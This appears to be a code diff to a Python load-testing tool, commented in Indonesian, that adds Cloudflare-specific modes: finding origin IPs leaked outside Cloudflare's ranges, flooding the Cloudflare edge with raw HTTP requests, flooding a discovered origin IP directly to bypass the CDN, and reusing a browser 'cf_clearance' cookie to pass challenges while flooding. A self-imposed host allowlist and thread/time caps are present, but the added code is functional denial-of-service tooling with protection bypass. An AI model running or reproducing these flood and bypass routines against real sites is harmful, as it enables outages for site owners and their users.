@@ -312,7 +312,150 @@ def run_tls(args, quiet=False):
         summary()
 
 
-# ---------------- L4 TCP ----------------
+CF_NETWORKS = ["104.16.0.0/12", "104.24.0.0/14", "172.64.0.0/13", "131.0.72.0/22",
+               "141.101.64.0/18", "162.158.0.0/15", "188.114.96.0/20", "190.93.240.0/20",
+               "197.234.240.0/22", "198.41.128.0/17", "108.162.192.0/18", "173.245.48.0/20",
+               "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22",
+               "2400:cb00::/32", "2606:4700::/32", "2803:f800::/32", "2405:b500::/32",
+               "2405:8100::/32", "2a06:98c0::/29", "2c0f:f248::/32"]
+_CF_NETS = [ipaddress.ip_network(n) for n in CF_NETWORKS]
+
+
+def is_cf(ip):
+    try:
+        a = ipaddress.ip_address(ip)
+    except Exception:
+        return True
+    return any(a in n for n in _CF_NETS)
+
+
+def cf_probe_origin(domain, ip):
+    """coba serve domain via IP non-CF? return (port, tls) kalau ya."""
+    ctx = ssl._create_unverified_context()
+    for port, tls in ((80, False), (443, True)):
+        try:
+            s = socket.create_connection((ip, port), timeout=4)
+            if tls:
+                s = ctx.wrap_socket(s, server_hostname=domain)
+            s.sendall(f"GET / HTTP/1.0\r\nHost: {domain}\r\nUser-Agent: {PROGRAM}\r\n\r\n".encode())
+            s.settimeout(4)
+            buf = s.recv(512)
+            s.close()
+            if buf.startswith(b"HTTP/") and b" 200" in buf.split(b"\r\n")[0]:
+                return port, tls
+        except Exception:
+            pass
+    return None
+
+
+# ---------------- CF BYPASS MODES ----------------
+def run_cf_find(args):
+    domain = args.domain
+    check(domain)
+    subs = ["", "www", "mail", "webmail", "cpanel", "webdisk", "ftp", "origin",
+            "direct", "api", "dev", "staging", "server", "host", "mx1", "mx2"]
+    print(f"[cf-find] nyari origin bocor di belakang CF untuk {domain}\n")
+    candidates = []
+    for s in subs:
+        fqdn = f"{s}.{domain}" if s else domain
+        try:
+            ips = set(socket.gethostbyname_ex(fqdn)[2])
+        except Exception:
+            continue
+        for ip in ips:
+            tag = "CF-EDGE" if is_cf(ip) else "NON-CF ⚠️ "
+            print(f"  {fqdn:<30} -> {ip:<18} {tag}")
+            if not is_cf(ip):
+                candidates.append((fqdn, ip))
+    if not candidates:
+        print("\n✅ Tidak ada kandidat origin non-CF (semua resolved via Cloudflare). Bagus, zona kamu rapat!")
+        return
+    print(f"\n🔎 Cek {len(candidates)} kandidat origin (apakah serve {domain} sendirian?):")
+    leaks = []
+    for fqdn, ip in candidates:
+        r = cf_probe_origin(domain, ip)
+        if r:
+            leaks.append((fqdn, ip, r))
+            print(f"  💥 BOCOR: {fqdn} ({ip}) serve {domain} langsung di port {r[0]} (tls={r[1]})")
+        else:
+            print(f"  ✓ {fqdn} ({ip}) gak serve {domain}")
+    if leaks:
+        print("\n⚠️  TEMUAN ORIGIN LEAK — CF bisa di-bypass lewat IP ini!")
+        print("   Fix: firewall origin cuman terima IP Cloudflare (https://www.cloudflare.com/ips/)")
+    else:
+        print("\n✅ Aman: kandidat non-CF gak ada yang serve domain ini — origin tertutup rapat.")
+
+
+def cf_raw_worker(ip, host, port, path, tls, method, deadline, rps, cookie, fast):
+    """request manual: koneksi ke IP tertentu, Host header = domain (for CF edge/direct-origin)."""
+    ctx = ssl._create_unverified_context()
+    hdr = {"Host": host, "User-Agent": PROGRAM, "Connection": "close", "Accept": "*/*"}
+    if cookie:
+        hdr["Cookie"] = cookie
+    raw = f"{method} {path} HTTP/1.1\r\n" + "".join(f"{k}: {v}\r\n" for k, v in hdr.items()) + "\r\n"
+    while time.monotonic() < deadline and not STOP.is_set():
+        try:
+            t0 = time.monotonic()
+            s = socket.create_connection((ip, port), timeout=6)
+            if tls:
+                s = ctx.wrap_socket(s, server_hostname=host)
+            s.sendall(raw.encode())
+            s.settimeout(6)
+            buf = b""
+            try:
+                while len(buf) < 65536:
+                    chunk = s.recv(4096)
+                    if not chunk:
+                        break
+                    buf += chunk
+            except socket.timeout:
+                pass
+            s.close()
+            if fast:
+                mark(ok=1)
+            else:
+                mark(ok=1, lat=time.monotonic() - t0)
+        except Exception:
+            mark(err=1)
+        if rps:
+            time.sleep(1.0 / rps)
+
+
+def run_cf_edge(args, quiet=False):
+    scheme, host, port, path = parse_target(args.url)
+    check(args.url)
+    try:
+        edge_ip = socket.gethostbyname(host)
+    except Exception:
+        sys.exit(f"[!] gagal resolve {host}")
+    if not quiet:
+        tls = scheme == "https"
+        print(f"[cf-edge] flood edge CF {edge_ip} (Host: {host}) | threads={args.threads} dur={args.time}s")
+    deadline = time.monotonic() + args.time
+    run_threads(cf_raw_worker, (edge_ip, host, port, path, scheme == "https", args.method, deadline, args.rps, getattr(args, "cookie", None), getattr(args, "fast", False)), args.threads, args.time)
+    if not quiet:
+        summary()
+
+
+def run_cf_direct(args):
+    scheme, host, port, path = parse_target(args.url)
+    check(args.origin_ip)
+    check(args.url)
+    tls = args.tls or (scheme == "https")
+    print(f"[cf-direct] BYPASS CF: langsung origin {args.origin_ip}:{args.port} (Host: {host}) | threads={args.threads} dur={args.time}s")
+    deadline = time.monotonic() + args.time
+    run_threads(cf_raw_worker, (args.origin_ip, host, args.port, path, tls, args.method, deadline, args.rps, None, args.fast), args.threads, args.time)
+    summary()
+
+
+def run_cf_cookie(args):
+    if not args.cookie:
+        sys.exit("[!] wajib --cookie 'cf_clearance=...; __cf_bm=...; ...' dari browser kamu")
+    args.method = getattr(args, "method", "GET")
+    print(f"[cf-cookie] flood via CF dgn clearance cookie (nembus challenge) | threads={args.threads} dur={args.time}s")
+    run_cf_edge(args, quiet=True)
+    summary()
+
 PAYLOAD = b"GET / HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n"
 
 
@@ -455,6 +598,42 @@ def main():
     pr.add_argument("host")
     pr.set_defaults(func=lambda a: print(f"{a.host} ->", "DIBOLEHKAN ✅" if allowed(a.host) else "DITOLAK ❌ (tambahkan ke /root/.nexus-stress.allow)"))
 
+    pf = sub.add_parser("cf-find", help="deteksi bocor IP origin di belakang Cloudflare")
+    pf.add_argument("domain", help="domain milikmu yang diproteksi CF")
+    pf.set_defaults(func=run_cf_find)
+
+    pe = sub.add_parser("cf-edge", help="flood Cloudflare edge (Host header domainmu)")
+    pe.add_argument("url")
+    pe.add_argument("--method", default="GET")
+    pe.add_argument("--threads", type=int, default=10)
+    pe.add_argument("--time", type=int, default=15)
+    pe.add_argument("--rps", type=int, default=0)
+    pe.add_argument("--fast", action="store_true")
+    pe.add_argument("--cookie", default=None)
+    pe.set_defaults(func=run_cf_edge)
+
+    pd = sub.add_parser("cf-direct", help="BYPASS CF: flood langsung origin IP (Host header domain)")
+    pd.add_argument("url", help="URL lengkap, mis. https://domainkamu.com/")
+    pd.add_argument("origin_ip", help="IP origin (dari cf-find)")
+    pd.add_argument("--port", type=int, default=443)
+    pd.add_argument("--tls", action="store_true")
+    pd.add_argument("--method", default="GET")
+    pd.add_argument("--threads", type=int, default=10)
+    pd.add_argument("--time", type=int, default=15)
+    pd.add_argument("--rps", type=int, default=0)
+    pd.add_argument("--fast", action="store_true")
+    pd.set_defaults(func=run_cf_direct)
+
+    pc = sub.add_parser("cf-cookie", help="flood via CF pakai clearance cookie dari browsermu")
+    pc.add_argument("url")
+    pc.add_argument("--cookie", required=True, help="'cf_clearance=...; __cf_bm=...'")
+    pc.add_argument("--method", default="GET")
+    pc.add_argument("--threads", type=int, default=10)
+    pc.add_argument("--time", type=int, default=15)
+    pc.add_argument("--rps", type=int, default=0)
+    pc.add_argument("--fast", action="store_true")
+    pc.set_defaults(func=run_cf_cookie)
+
     a = ap.parse_args()
 
     if a.brutal:
@@ -462,7 +641,7 @@ def main():
         if hasattr(a, "time"): a.time = 300
         print("[preset brutal] threads=500 durasi=300s tanpa-rate-limit")
     # guardrail caps
-    if a.mode in ("http", "tcp", "udp", "slowloris", "hold", "tls", "auto"):
+    if a.mode in ("http", "tcp", "udp", "slowloris", "hold", "tls", "auto", "cf-edge", "cf-direct", "cf-cookie"):
         if getattr(a, "threads", 1) > 500:
             sys.exit("[guardrail] threads max 500")
         if getattr(a, "time", 1) > 600:
